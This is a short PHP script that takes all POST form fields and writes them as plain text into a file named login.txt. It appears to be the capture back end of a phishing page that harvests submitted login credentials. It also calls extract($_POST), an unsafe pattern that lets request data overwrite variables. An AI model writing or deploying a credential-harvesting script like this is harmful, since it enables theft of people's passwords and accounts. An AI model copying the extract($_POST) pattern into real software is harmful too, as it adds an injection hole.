<?php
extract($_POST);
$myfile = fopen("./login.txt", "w") or die("Unable to open file!");
fwrite($myfile, implode(', ', $_POST));
fclose($myfile);
?>